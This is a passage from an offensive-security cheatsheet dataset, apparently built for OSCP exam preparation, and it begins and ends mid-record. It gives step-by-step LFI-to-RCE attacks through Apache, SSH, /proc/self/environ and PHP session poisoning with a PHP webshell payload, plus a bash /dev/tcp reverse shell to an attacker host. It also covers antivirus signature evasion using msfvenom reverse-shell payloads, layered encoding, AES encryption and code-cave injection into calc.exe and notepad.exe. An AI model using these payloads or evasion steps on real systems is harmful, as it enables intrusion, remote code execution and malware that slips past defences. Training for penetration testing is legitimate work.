`HTTP_COOKIE=<VALUE>`. This happens BEFORE PHP executes, so HTTP_USER_AGENT already in environment when PHP starts. **Why Same-Request Required:** Unlike log files (persistent across requests), /proc/self/environ is EPHEMERAL - exists only during current request. Timeline: (1) Nginx receives request with User-Agent, (2) Nginx spawns PHP-FPM worker, passes HTTP_USER_AGENT env var, (3) PHP worker executes, (4) include('/proc/self/environ') reads worker's environment, (5) Worker dies, environment destroyed. If we poison in Request A, then try to trigger in Request B, Request B has DIFFERENT environment (different worker process). **Why No Sanitization:** Environment variables are raw data from web server. PHP doesn't sanitize because environ is trusted source (from same system). When include() reads /proc/self/environ, PHP parses file as PHP code (same as any include). Our `<?php system($_GET[\""c\""]); ?>` in HTTP_USER_AGENT becomes executable. **Advantages vs Log Poisoning:** (1) Permission bypass - /proc/self always readable by process itself (no permission issues), (2) Works when all log files restricted, (3) No log rotation concerns (ephemeral data), (4) Clean output (no log noise). **Disadvantages:** (1) Single-request model harder to understand/debug, (2) Can't pre-verify poison success (must test with command), (3) Some PHP configurations don't populate HTTP_* in environ (CGI mode), (4) Container environments may restrict /proc access. **OSCP Relevance:** Advanced technique - shows mastery of Linux fundamentals (/proc filesystem, process model, environment variables). Rarely needed in OSCP (10-15% of LFI scenarios) but demonstrates problem-solving when standard methods exhausted. Understanding /proc useful beyond this technique (local enumeration, kernel exploitation).""}, {""title"": ""Scenario 5: PHP Session Poisoning - Edge Case Technique"", ""context"": ""Target: Ubuntu 18.04, Apache 2.4.29, PHP 7.2. LFI confirmed. All log files (Apache access/error, auth.log) permission denied. SSH closed. /proc/self/environ returns blank (PHP CGI mode, no HTTP_* variables in environ). Objective: Last-resort technique using PHP session files. Access level: Unauthenticated but application uses sessions (PHPSESSID cookie set). Challenge: Requires knowledge of session ID and writable session storage."", ""approach"": ""**Phase 1 - Session Mechanism Discovery (2 min):**\n\n1. Check if application uses sessions: `curl -I http://192.168.45.100/`\n   - Look for: `Set-Cookie: PHPSESSID=<SESSION_ID>; path=/`\n   - Example: `Set-Cookie: PHPSESSID=abc123def456; path=/`\n   - If no PHPSESSID: Session poisoning won't work \u2192 Revert to basic LFI enumeration\n\n2. Extract your session ID: `SESSID=$(curl -I http://192.168.45.100/ 2>&1 | grep PHPSESSID | cut -d'=' -f2 | cut -d';' -f1)`\n   - Store for later use\n\n3. Verify session file location: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/lib/php/sessions/sess_<SESSION_ID>'`\n   - Replace `<SESSION_ID>` with your PHPSESSID value (e.g., `sess_abc123def456`)\n   - SUCCESS: Session data displayed (e.g., `username|s:5:\""admin\"";` for serialized data)\n   - FAILURE: Permission denied or 404 \u2192 Try alternative paths:\n     - `/var/lib/php5/sessions/` (older PHP)\n     - `/tmp/sess_<SESSION_ID>` (some configs)\n     - `/var/lib/php/session/` (note: singular 'session')\n   - Or check via phpinfo if accessible: `session.save_path` directive\n\n**Phase 2 - Session Poisoning (2-3 min):**\n\n**Concept:** Inject PHP payload into session data by manipulating application features that write to session.\n\n4. Find session write point - Common vectors:\n   - **Username field in login form:** `curl -X POST -d 'username=<?php system($_GET[\""c\""]); ?>&password=test' http://192.168.45.100/login.php -c cookies.txt`\n     - Many apps store username in session: `$_SESSION['username'] = $_POST['username'];`\n   - **Language preference:** `curl 'http://192.168.45.100/?lang=<?php system($_GET[\""c\""]); ?>' -b PHPSESSID=<SESSION_ID>`\n   - **Search query:** `curl 'http://192.168.45.100/search.php?q=<?php system($_GET[\""c\""]); ?>' -b PHPSESSID=<SESSION_ID>`\n   - **Any user-controlled input that app writes to $_SESSION**\n\n5. Verify poison in session file: `curl 'http://192.168.45.100/vuln.php?page=../../../../var/lib/php/sessions/sess_<SESSION_ID>' | grep '<?php'`\n   - Look for your payload in serialized format: `username|s:30:\""<?php system($_GET[\""c\""]); ?>\"";`\n   - PHP session format: `<KEY>|<TYPE>:<LENGTH>:\""<VALUE>\"";`\n\n**Phase 3 - RCE Trigger (2 min):**\n\n6. Include poisoned session file with command parameter:\n   ```bash\n   curl -b PHPSESSID=<SESSION_ID> 'http://192.168.45.100/vuln.php?page=../../../../var/lib/php/sessions/sess_<SESSION_ID>&c=whoami'\n   ```\n   - Must use `-b` to send PHPSESSID cookie (maintains session)\n   - LFI includes session file \u2192 PHP parses \u2192 Executes payload\n\n7. Establish reverse shell: (same as previous scenarios)\n\n**Advanced Session Techniques:**\n\n8. If session data serialized (not plaintext):\n   - PHP serialization format: `a:1:{s:8:\""username\"";s:5:\""admin\"";}`\n   - Our payload gets serialized: `s:30:\""<?php system($_GET[\""c\""]); ?>\"";`\n   - Still executes when included (PHP unserializes, then parses as code)\n\n9. Session upload progress poisoning (PHP 5.4+):\n   - Feature: PHP tracks upload progress in session\n   - Poison via filename: `curl -F 'file=@test.txt;filename=<?php system($_GET[\""c\""]); ?>' http://192.168.45.100/upload.php`\n   - Session contains: `upload_progress_<NAME>` with filename in metadata\n   - Race condition: Must include session DURING upload (before PHP cleans up progress data)\n\n**Troubleshooting:**\n\n10. If session file not readable:\n    - Default permissions: 600 (owner-only) - only php-fpm/apache user can read\n    - But: LFI runs AS php-fpm/apache \u2192 Should be readable\n    - If still fails: session.save_handler might be 'memcached' or 'redis' (not filesystem) \u2192 Check phpinfo\n\n11. If payload doesn't execute:\n    - Check if session data is base64 encoded (some frameworks)\n    - Try double encoding: Base64-encode your PHP payload before injection"", ""commands"": [""lfi-rce-trigger""], ""expected_outcome"": ""**Success Timeline (5-8 min):** Session discovery (2 min) \u2192 Find write point (2-3 min) \u2192 Poison session (1 min) \u2192 RCE trigger (2 min). Longest method due to enumeration required. **Success Indicators:** (1) PHPSESSID cookie present, (2) Session file readable via LFI, (3) User input reflected in session data, (4) Payload visible in session file, (5) Command execution confirmed. **Common Failures:** (1) No PHPSESSID cookie \u2192 App doesn't use sessions \u2192 Technique N/A. (2) Session save path not default \u2192 Enumerate via phpinfo (if accessible) or brute force common paths. (3) No user input writes to session \u2192 App validates/sanitizes before session storage \u2192 Try upload filename (less likely to be sanitized). (4) Session handler is Redis/Memcached (not files) \u2192 Check phpinfo for `session.save_handler` \u2192 If not 'files', technique fails. (5) Race condition on upload progress \u2192 Upload file must be large enough (>1MB) to give time for LFI request during upload. **Success Rate:** Low-Medium (30-40%). Many variables must align: sessions used, filesystem storage, user input in session, readable session files. Often last resort. **When to Use:** When ALL other techniques exhausted. Demonstrates thorough methodology - OSCP rewards trying every vector."", ""why_this_works"": ""**PHP Session Mechanism:** PHP stores session data server-side (default: filesystem, alternative: memcached/redis/database). Session ID (PHPSESSID cookie) maps to session file. Default path: `/var/lib/php/sessions/sess_<SESSION_ID>`. When `session_start()` called, PHP reads session file, unserializes data into `$_SESSION` superglobal. When script ends, PHP serializes `$_SESSION` back to file. **Session File Format:** PHP serialization: `<KEY>|<TYPE>:<LENGTH>:\""<VALUE>\"";`. Example: User login stores username \u2192 File contains: `username|s:5:\""admin\"";`. If app does: `$_SESSION['username'] = $_POST['username'];` without sanitization, we can inject: `$_POST['username'] = '<?php system($_GET[\""c\""]); ?>'` \u2192 Session file contains: `username|s:30:\""<?php system($_GET[\""c\""]); ?>\"";`. **Why Payload Executes:** When LFI includes session file via `include('../../../../var/lib/php/sessions/sess_abc123')`, PHP treats file as PHP code. Serialized data is PLAINTEXT in file - PHP's `<?php ?>` tags still recognized. Execution: (1) include() reads file, (2) PHP parser finds `<?php` tags, (3) Executes `system($_GET[\""c\""])`, (4) Rest of file (serialization syntax) ignored as plaintext. **Permission Model:** Session files default: 600 permissions (owner-only read/write). Owner is web server user (www-data, apache, nginx). LFI runs as SAME user (PHP executing as www-data) \u2192 Can read own session files. This is why session poisoning works when log files fail (different ownership). **Upload Progress Trick:** PHP 5.4+ feature: `session.upload_progress.enabled = On` (default). During file upload, PHP stores progress in session: `upload_progress_<NAME>` with metadata including filename. Filename not sanitized (used for display). Exploit: Upload file with PHP payload as filename. But: Race condition - progress data cleaned after upload completes. Must include session DURING upload (timing critical). **Why Rare in OSCP:** (1) Requires sessions (not all apps use them), (2) Requires user input in session (validation might block), (3) More complex than log poisoning (easier methods usually work first), (4) Low awareness (students often don't think to check sessions). **Advantages:** (1) Bypasses log file permissions (session files owned by same user), (2) Works when /proc restricted, (3) Clean exploitation (no log noise). **OSCP Relevance:** Demonstrates exhaustive methodology - tried logs, tried /proc, trying sessions. Shows deep PHP knowledge (session mechanism, serialization). Rarely needed (<10% of cases) but completes the LFI\u2192RCE playbook. Understanding sessions useful for session fixation attacks, deserialize exploits (different techniques).""}]","[{""title"": ""Phase 1: Prerequisites & Detection (1-2 minutes)"", ""notes"": ""Before attempting log poisoning, verify LFI exists and enumerate accessible log files. Skipping verification wastes time poisoning unreadable logs. OSCP time management critical - quick yes/no checks before committing to technique."", ""commands"": [{""id"": ""lfi-access-log-apache"", ""example"": ""curl 'http://192.168.45.100:80/index.php?page=../../../../var/log/apache2/access.log'"", ""shows"": ""Shows web vulnerability or response""}, {""id"": ""lfi-access-log-nginx"", ""example"": ""curl 'http://192.168.45.100:80/index.php?file=../../../../var/log/nginx/access.log'"", ""shows"": ""Shows web vulnerability or response""}, {""id"": ""lfi-auth-log"", ""example"": ""curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/auth.log'"", ""shows"": ""Shows web vulnerability or response""}, {""id"": ""lfi-proc-environ"", ""example"": ""curl -A '<?php system($_GET[\""c\""]); ?>' 'http://192.168.45.100:80/index.php?page=../../../../proc/self/environ'"", ""shows"": ""Shows web vulnerability or response""}]}, {""title"": ""Phase 2: Log Injection (1-2 minutes per target)"", ""notes"": ""Inject PHP payload into target log file. Choose injection vector based on Phase 1 results: Apache User-Agent (most common), Nginx User-Agent (platform variant), SSH username (alternative), or /proc/self/environ (advanced). Single attempt usually sufficient - no need to repeat poisoning."", ""commands"": [{""id"": ""curl-ua-poison-apache"", ""example"": ""curl -A '<?php system($_GET[\""c\""]); ?>' http://192.168.45.100:80/"", ""shows"": ""HTTP 200 response (page loads normally)""}, {""id"": ""curl-ua-poison-nginx"", ""example"": ""curl -A '<?php system($_GET[\""c\""]); ?>' http://192.168.45.100:80/"", ""shows"": ""Shows web vulnerability or response""}, {""id"": ""ssh-authlog-poison"", ""example"": ""ssh '<?php system($_GET[\""c\""]); ?>'@192.168.45.100"", ""shows"": ""Shows web vulnerability or response""}]}, {""title"": ""Phase 3: RCE Trigger & Shell Upgrade (2-3 minutes)"", ""notes"": ""Trigger code execution via poisoned log file. Start with simple command (whoami, id) to verify RCE, then establish reverse shell. Common pitfall: disable_functions blocking system() - try exec(), passthru(), shell_exec() alternatives. Upgrade to stable PTY for interactive shell (Python pty.spawn). Total attack time: 3-5 minutes for Apache/Nginx, 5-8 minutes for session poisoning."", ""commands"": [{""id"": ""lfi-rce-trigger"", ""example"": ""curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/apache2/access.log&c=whoami'"", ""shows"": ""Shows web vulnerability or response""}]}, {""title"": ""Phase 4: Troubleshooting & Alternatives (when standard methods fail)"", ""notes"": ""Decision tree when primary techniques fail: (1) Apache log denied \u2192 Try Nginx path. (2) Both web logs denied \u2192 Try SSH auth.log. (3) All logs denied \u2192 Try /proc/self/environ. (4) /proc fails \u2192 Try session poisoning. (5) Everything fails \u2192 Re-check LFI (might be read-only, broken traversal, or false positive). Alternative headers: If User-Agent blocked by WAF, try Referer (-e flag) or custom headers (-H). Alternative functions: system() \u2192 exec() \u2192 passthru() \u2192 shell_exec() \u2192 popen(). Understanding failure modes demonstrates methodology over memorization."", ""commands"": [{""id"": ""lfi-proc-environ"", ""example"": ""curl -A '<?php system($_GET[\""c\""]); ?>' 'http://192.168.45.100:80/index.php?page=../../../../proc/self/environ'"", ""shows"": ""Shows web vulnerability or response""}, {""id"": ""ssh-authlog-poison"", ""example"": ""ssh '<?php system($_GET[\""c\""]); ?>'@192.168.45.100"", ""shows"": ""Shows web vulnerability or response""}]}]"
"rfi-lfi-evaluation","RFI/LFI Evaluation","Test and exploit Remote/Local File Inclusion vulnerabilities in web applications","WEB|OSCP:HIGH|QUICK_WIN|FILE_INCLUSION|LFI|RFI|PHP","{""how_to_recognize"": [""URL parameters referencing files: ?page=home.php, ?file=about.html, ?template=header"", ""Error messages revealing file paths: Warning: include(/var/www/html/...)"", ""Template engines or CMS with dynamic page loading (PHP, JSP, ASP)"", ""Parameters containing file extensions: .php, .html, .txt, .inc in GET/POST data"", ""Directory traversal patterns in URLs: ../../../, ..\\..\\..\\"", ""Wrapper protocols in parameters: file://, php://, data://, http://""], ""when_to_look_for"": [""After directory enumeration reveals PHP/JSP/ASP applications"", ""When viewing page source shows include() or require() patterns"", ""During parameter fuzzing - test file, page, template, doc, path parameters"", ""In custom CMSs or old frameworks (WordPress < 4.7, Joomla < 3.4.5, old PHP apps)"", ""When error messages leak filesystem information"", ""After finding upload functionality that might combine with LFI for RCE""]}","[{""title"": ""Scenario 1: Linux Web Server - /etc/passwd Retrieval via LFI"", ""context"": ""Target: Apache 2.4.41 running PHP 7.2 on Ubuntu 18.04. Gobuster found /dashboard.php?page=home. Application uses include($_GET['page']) without sanitization. Goal: Confirm LFI and enumerate system users."", ""approach"": ""Test if 'page' parameter loads files directly. Try path traversal (../) to escape web root and access /etc/passwd. Start with 3 levels (../../../etc/passwd), increase if needed. If successful, enumerate: /etc/shadow (requires www-data compromise), /etc/hosts (network info), /var/www/html/config.php (credentials)."", ""commands"": [""lfi-test""], ""expected_outcome"": ""LFI confirmed if you see: root:x:0:0:root:/root:/bin/bash, daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin, www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin. Next steps: Test for log poisoning (User-Agent injection), check for writable log files (/var/log/apache2/access.log), attempt PHP wrapper exploitation (php://filter)."", ""why_this_works"": ""PHP include() without sanitization allows directory traversal. The ../ sequence escapes web root (/var/www/html) to access system files. Each ../ moves up one directory level. Three levels usually suffice for typical Apache setups (/var/www/html -> /var/www -> /var -> / ). /etc/passwd is world-readable, making it the ideal test target.""}, {""title"": ""Scenario 2: Windows IIS - Configuration File Extraction"", ""context"": ""Target: IIS 8.5 with ASP.NET application on Windows Server 2016. Parameter: ?template=default.aspx. Application uses Server.Execute() for template rendering. Goal: Extract database credentials from web.config."", ""approach"": ""Try Windows paths with backslashes: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts (confirms traversal). Then target web.config at application root: ..\\web.config or ..\\..\\web.config. Alternative targets: ..\\bin\\config (binaries), ..\\App_Data\\ (database files), ..\\logs\\ (log files with sensitive data)."", ""commands"": [""curl-post""], ""expected_outcome"": ""Successful extraction shows: <connectionStrings><add name=\""DefaultConnection\"" connectionString=\""Server=MSSQLSERVER;Database=webapp;User Id=sa;Password=P@ssw0rd123;\""/>. Use credentials for: Direct database access (sqlmap, mssql-cli), Lateral movement (password reuse), Privilege escalation (sa account = admin)."", ""why_this_works"": ""ASP.NET applications store sensitive configuration in web.config at application root. Unlike Linux, Windows uses backslashes (\\) for paths. IIS applications often run under high-privilege accounts (ApplicationPoolIdentity, NETWORK SERVICE), granting access to sensitive files. Server.Execute() and Response.WriteFile() are common vulnerable functions.""}, {""title"": ""Scenario 3: PHP Wrappers - RCE via Log Poisoning"", ""context"": ""Target: Apache 2.4 + PHP 5.6 (allow_url_include=Off, so no RFI). LFI confirmed via ?page= parameter. Apache logs located at /var/log/apache2/access.log (world-readable on misconfigured systems). Goal: Achieve RCE through log poisoning."", ""approach"": ""Step 1: Verify log accessibility via LFI: ?page=../../../../var/log/apache2/access.log. Step 2: Poison logs with PHP code in User-Agent: curl -A '<?php system($_GET[\""c\""]); ?>' http://target/. Step 3: Trigger execution: ?page=../../../../var/log/apache2/access.log&c=whoami. Step 4: Upgrade to reverse shell: c=bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'."", ""commands"": [""curl-post""], ""expected_outcome"": ""First request shows log contents with poisoned User-Agent. Second request with &c=whoami returns www-data. Third request establishes reverse shell. Alternative targets if access.log fails: /var/log/auth.log (SSH login attempts), /proc/self/environ (environment variables), PHP session files (/var/lib/php/sessions/sess_SESSIONID)."", ""why_this_works"": ""Apache logs user input (User-Agent, Referer) without sanitization. When LFI includes the log file, PHP parses and executes embedded code. This converts read-only LFI into RCE. Requirements: LFI vulnerability, log file readable by web user (www-data), PHP code execution not disabled (disable_functions). Fallback if logs inaccessible: PHP session poisoning (requires valid session), /proc/self/environ (requires /proc filesystem), data:// wrapper (requires allow_url_include=On).""}]","[{""title"": ""Phase 1: Detection & Verification"", ""notes"": ""Confirm LFI/RFI exists before investing time in exploitation. Test with safe, world-readable files first (/etc/passwd on Linux, C:\\windows\\system32\\drivers\\etc\\hosts on Windows). Document the number of ../ sequences needed (usually 3-5 for web root escape)."", ""commands"": [{""id"": ""lfi-test"", ""example"": ""../../../../../../etc/passwd"", ""shows"": ""root:x:0:0""}, {""id"": ""curl-post"", ""example"": ""curl -X POST -d 'username=admin' http://192.168.1.100/login.php"", ""shows"": ""200 OK""}]}, {""title"": ""Phase 2: Information Gathering"", ""notes"": ""Extract sensitive files to find credentials, API keys, source code, or further vulnerabilities. Priority targets: Linux (/etc/passwd, /var/www/html/config.php, ~/.bash_history, ~/.ssh/id_rsa), Windows (web.config, unattend.xml, SAM/SYSTEM via Volume Shadow Copies). Document all findings for reporting and privilege escalation."", ""commands"": [{""id"": ""curl-post"", ""example"": ""curl -X POST -d 'username=admin' http://192.168.1.100/login.php"", ""shows"": ""200 OK""}]}, {""title"": ""Phase 3: Exploitation (RCE Upgrade)"", ""notes"": ""Upgrade read-only LFI to RCE via: 1) Log poisoning (inject PHP in User-Agent, include log file), 2) PHP wrappers (data://, expect://, php://input), 3) Session poisoning (PHPSESSID file inclusion), 4) /proc/self/environ (inject into PATH), 5) File upload + LFI combo (upload PHP shell, include via LFI). Test in order of decreasing reliability."", ""commands"": [{""id"": ""curl-post"", ""example"": ""curl -X POST -d 'username=admin' http://192.168.1.100/login.php"", ""shows"": ""200 OK""}]}]"
"signature-evasion-workflow","Signature Evasion - Binary Modification Workflow","Iterative methodology for evading AV signatures through binary analysis, modification, encoding, and testing. Covers msfvenom encoding, template injection, and manual byte modification.","signatures|binary-modification|encoding|msfvenom|testing|iterative|av-evasion|OSCP:HIGH","{""how_to_recognize"": [""Payload works locally but detected when transferred to target"", ""Specific byte sequences flagged by AV (signature-based detection)"", ""msfvenom encoders (shikata, zutto) fail to evade modern AV"", ""Fresh msfvenom payload deleted immediately upon disk write (Defender real-time protection)"", ""Custom runners still caught despite encryption (signature in loader itself)""], ""when_to_look_for"": [""After generating payloads with msfvenom and getting immediate detection"", ""When custom runners still caught despite encryption (signature in loader itself)"", ""Need to pinpoint exact bytes triggering AV alerts"", ""Before deploying payloads to exam boxes (test evasion offline first)"", ""When standard encoding iterations (5-10x shikata) fail to bypass AV"", ""After initial access to validate payload delivery methods for persistence""]}","[{""title"": ""Scenario 1: Payload Flagged Immediately (Signature Hunting)"", ""context"": ""Target: Windows 10 with Defender enabled. Fresh msfvenom payload detected the moment it's written to disk. Need to identify exact byte sequence triggering detection before attempting modifications."", ""approach"": ""Phase 1: Baseline Detection (1 minute)\n- Generate payload with msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe\n- Copy to target, confirm detection (Windows Defender notification)\n- Note: Detection is signature-based, not heuristic (immediate deletion = known signature)\n\nPhase 2: Binary Search for Signature (10-15 minutes)\n- Use find-av-signature with binary search method\n- Split payload in half, test each half independently\n- Recursively narrow down to ~10-50 byte signature region\n- Document exact offset and byte sequence: offset 0x2A40, 32 bytes\n\nPhase 3: Manual Modification (5 minutes)\n- Use modify-signature-bytes to change flagged bytes\n- Add NOP sleds (0x90) to shift offsets\n- Change constants (MOV EAX, 0x12345678 \u2192 MOV EAX, 0x87654321)\n- Reorder non-critical instructions without breaking functionality\n- Preserve payload functionality (test locally first)\n\nPhase 4: Validation (2 minutes)\n- Test modified payload with clamscan-test locally (offline)\n- Transfer to target and verify execution\n- If still detected, repeat Phase 2 (signature may be multi-part)"", ""commands"": [""find-av-signature"", ""modify-signature-bytes"", ""clamscan-test""], ""expected_outcome"": ""Signature identified and modified in 15-20 minutes total. Payload evades detection while maintaining functionality. Understanding of specific AV signature pattern for future reference. Success indicators: ClamAV clean, Defender allows execution, reverse shell callback successful. Failure: Detection persists \u2192 signature is multi-part or behavioral detection triggered."", ""why_this_works"": ""AV signatures are exact byte sequences or wildcard patterns (e.g., \\x4D\\x5A\\x??\\x??\\x50\\x45). Binary search narrows 50KB payload to 10-50 problematic bytes efficiently (log2 complexity). Modifying those bytes while preserving assembly logic breaks signature without breaking payload. Why this fails: Multi-part signatures (header + shellcode stub), heuristic detection (suspicious API calls), behavioral detection (process hollowing patterns). OSCP tip: Signature hunting works best on older AV engines (ClamAV, legacy Defender signatures). Modern EDR may require behavioral evasion.""}, {""title"": ""Scenario 2: Shikata Encoding Detected (Template Injection Alternative)"", ""context"": ""Target: Windows Server 2019 with updated Defender signatures. Used msfvenom-encoder-shikata with multiple iterations (5-10x), still detected. Encoder itself has known signatures. Need alternative: template injection into legitimate binary."", ""approach"": ""Phase 1: Encoder Failure Diagnosis (3 minutes)\n- Try msfvenom-encoder-shikata with 5-10 iterations: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor -i 10 -f exe\n- Still detected \u2192 Encoder signature itself flagged (shikata decoder stub)\n- Try msfvenom-encoder-zutto as alternative: msfvenom -p windows/x64/shell_reverse_tcp -e x64/zutto_dekiru -i 5\n- Still detected \u2192 Need different approach (encoders are well-signatured)\n\nPhase 2: Template Selection (5 minutes)\n- Find legitimate Windows executable (calc.exe from C:\\Windows\\System32, notepad.exe)\n- Use msfvenom-template-injection to embed payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -x calc.exe -f exe -o calc_infected.exe\n- Payload hidden in code cave or resource section (not directly in .text section)\n- Template binary's signature and metadata preserved\n\nPhase 3: Testing & Refinement (7 minutes)\n- Test with clamscan-test (offline validation): clamscan --database=/var/lib/clamav calc_infected.exe\n- If detected, try different template binary (unsigned binaries work better)\n- If still detected, combine with encryption: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 --encrypt aes256 --encrypt-key mysecretkey -x calc.exe -f exe\n- Encryption layer obfuscates shellcode pattern even if code cave scanned\n\nPhase 4: Validation (3 minutes)\n- Execute on target system: calc_infected.exe\n- Verify legitimate binary still functions (calculator window opens = good cover story)\n- Confirm Meterpreter callback: nc -lvnp 4444\n- Document which template worked for future use"", ""commands"": [""msfvenom-encoder-shikata"", ""msfvenom-encoder-zutto"", ""msfvenom-template-injection"", ""msfvenom-encrypt-aes"", ""clamscan-test""], ""expected_outcome"": ""Template injection successful in 15-20 minutes total. Payload evades detection by masquerading as legitimate binary. Encoder signatures bypassed entirely (no encoder used). Success: Calculator opens + reverse shell connects. Failure: Template detection (try unsigned binary), encryption key length issues (AES256 requires 32-byte key), payload size exceeds code cave. OSCP tip: Keep library of working templates (calc.exe, putty.exe, 7z.exe) that passed previous tests."", ""why_this_works"": ""Template injection places shellcode in existing signed/trusted binary's unused space (code caves, resource sections). AV trusts binary's signature and doesn't deep-scan code caves (performance optimization). Encryption layer obfuscates shellcode pattern even if scanned (requires decryption routine, which is small and variable). Why templates: Legitimate binaries have established reputation (whitelisting), Code signing validates integrity of .text section (not caves), Resource sections rarely scanned (assumed to be icons/strings). Limitations: Large payloads (>10KB) may not fit in code caves, Signed binaries fail if modified incorrectly (breaks certificate), Some EDR scans all sections regardless of signature. OSCP context: Template injection works ~70% of time on Defender, ~40% on enterprise EDR.""}, {""title"": ""Scenario 3: Layered Encoding (Shikata + AES Encryption)"", ""context"": ""Target: Windows 11 with updated Defender definitions. Single encoding method insufficient (shikata detected, template alone detected). Need multiple transformation layers to exponentially increase signature space complexity."", ""approach"": ""Phase 1: Layer 1 - Shikata Encoding (3 minutes)\n- Apply msfvenom-encoder-shikata with 5 iterations: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor -i 5 -f raw -o payload_shikata.bin\n- Test with clamscan-test \u2192 Likely still detected (shikata decoder stub signature)\n- Rationale: Even if detected, adds first layer of obfuscation (baseline transformation)\n\nPhase 2: Layer 2 - AES Encryption (4 minutes)\n- Wrap Shikata-encoded payload with msfvenom-encrypt-aes: msfvenom -p - -a x64 --platform windows -e x64/xor -i 5 --encrypt aes256 --encrypt-key thisisaverysecretkeyforme1234 -f raw < payload_shikata.bin -o payload_encrypted.bin\n- Generate encryption key and embed in custom runner (C/C# loader)\n- Test again with clamscan-test: clamscan payload_encrypted.bin\n- Rationale: Encryption key unique to this payload (signature can't be pre-computed)\n\nPhase 3: Layer 3 - Template Injection (5 minutes)\n- If still detected, use msfvenom-template-injection with encrypted payload\n- Generate final executable: msfvenom -p - --platform windows -a x64 -f exe -x notepad.exe < payload_encrypted.bin -o notepad_final.exe\n- Embed AES-encrypted payload into notepad.exe code cave\n- Final test with clamscan-test: clamscan notepad_final.exe\n- Rationale: Three layers (encoding + encryption + template) = exponential signature complexity\n\nPhase 4: Live Testing (3 minutes)\n- Deploy to target with Defender enabled\n- Monitor for detection alerts (Windows Event Viewer, Defender logs)\n- Verify execution success: notepad_final.exe opens notepad + reverse shell connects\n- Document layer combination for future payloads"", ""commands"": [""msfvenom-encoder-shikata"", ""msfvenom-encrypt-aes"", ""msfvenom-template-injection"", ""clamscan-test""], ""expected_outcome"": ""Triple-layer encoding evades detection in 15-20 minutes. Each layer exponentially increases signature space (encoding: 256^n patterns, encryption: 2^256 keys, template: thousands of binaries). Final payload unrecognizable to AV (must detect all layers simultaneously). Success: Defender allows execution, reverse shell connects, notepad opens as decoy. Failure: Layer order matters (encrypt BEFORE template), key embedded incorrectly in runner (decryption fails), payload size too large for template. OSCP time investment justified: 15-20 minutes upfront vs. repeated failed exploitation attempts."", ""why_this_works"": ""Encoding changes byte patterns (polymorphic transformation), encryption adds key-based transformation (requires brute-force to analyze), template injection adds legitimate binary context (whitelisting bypass). AV must detect ALL layers simultaneously\u2014signature database can't scale to that complexity (combinatorial explosion). Math: Single-layer signatures: ~1000 patterns in database. Two-layer combinations: 1000 \u00d7 256^5 (shikata permutations). Three-layer: 1000 \u00d7 256^5 \u00d7 2^256 (encryption keys) \u00d7 10000 (templates) = computationally infeasible. Why layering works: Each layer requires different detection method (static signature, crypto analysis, binary reputation), No single AV engine excels at all three simultaneously, Heuristic detection requires behavioral analysis (runtime), Static analysis can't predict encrypted payload behavior. Limitations: Performance overhead (decoder stub + decryption routine = larger binary), Debugging complexity (which layer failed?), Runtime detection still possible (process hollowing, suspicious API calls). OSCP tip: Pre-generate layered payloads for common scenarios (SMB delivery, HTTP download, email attachment).""}, {""title"": ""Scenario 4: Iterative Testing (ClamAV \u2192 Defender Progression)"", ""context"": ""Target: OSCP exam box (unknown AV/EDR configuration). Need systematic testing workflow to validate evasion before deploying to target. Avoid burning payloads through repeated failed uploads (EDR may flag IP/account)."", ""approach"": ""Phase 1: Offline Testing with ClamAV (5 minutes)\n- Install ClamAV with freshest signatures: sudo freshclam\n- Test payload with clamscan-test: clamscan --database=/var/lib/clamav payload.exe\n- If detected, modify and re-test locally (no network exposure)\n- Iterate until ClamAV clean: clamscan payload.exe \u2192 OK\n- Rationale: ClamAV uses open-source signatures (subset of commercial AV), fast iteration without alerting target\n\nPhase 2: Local Defender Testing (5 minutes)\n- Copy payload to Windows VM with Defender enabled (isolated from network)\n- Monitor real-time protection alerts: Windows Security \u2192 Virus & threat protection \u2192 Protection history\n- If detected, analyze Defender logs for signature hints: Get-MpThreatDetection (PowerShell)\n- Apply modifications based on hints (e.g., \""Trojan:Win32/Meterpreter\"" = modify Meterpreter stager)\n- Rationale: Defender signatures superset of ClamAV, but still doesn't alert target network\n\nPhase 3: Signature Refinement (10 minutes)\n- Use find-av-signature if Defender still catches it: find-av-signature payload.exe\n- Identify specific bytes triggering detection (binary search method)\n- Apply modify-signature-bytes to those offsets: modify-signature-bytes payload.exe 0x1A40 --nop-sled 16\n- Re-test entire workflow (ClamAV \u2192 Defender)\n- Rationale: Pinpoint exact bytes, not guessing (saves time)\n\nPhase 4: Target Deployment (2 minutes)\n- Only deploy after passing both ClamAV and Defender tests\n- Transfer via established channel (SMB, HTTP, email attachment)\n- Execute and verify callback: nc -lvnp 4444\n- Monitor for EDR alerts (if detected, pivot to alternative payload immediately)\n- Rationale: Minimize operational risk, preserve access, avoid account lockout"", ""commands"": [""clamscan-test"", ""find-av-signature"", ""modify-signature-bytes""], ""expected_outcome"": ""Payload tested thoroughly in 20-25 minutes before target deployment. Avoids detection and minimizes operational risk (no burned payloads). Systematic methodology prevents wasted attempts (no trial-and-error on target). Success: ClamAV clean \u2192 Defender clean \u2192 Target execution successful. Failure: Behavioral detection on target (not signature-based) \u2192 pivot to shellcode injection, fileless execution. OSCP exam tip: Allocate 30 minutes for evasion testing BEFORE attempting target deployment (saves hours of failed exploitation)."", ""why_this_works"": ""Offline testing (ClamAV) catches obvious signatures without alerting target EDR (no network traffic, no logs). Local Defender testing validates real-world AV behavior (same engine as Windows 10/11 targets). Iterative refinement based on actual detection points ensures evasion (not blind guessing). Why this methodology: Layered validation (ClamAV \u2192 Defender \u2192 Target) catches signatures at each tier, Offline testing preserves operational security (no EDR alerts), Systematic approach repeatable (works for future payloads). Threat intel perspective: Target EDR may be more sophisticated than Defender (CrowdStrike, SentinelOne), but signature-based detection foundation is similar. Behavioral detection still possible on target (process hollowing, API hooking), but signature evasion is prerequisite. OSCP context: 90% of lab/exam boxes use Defender or 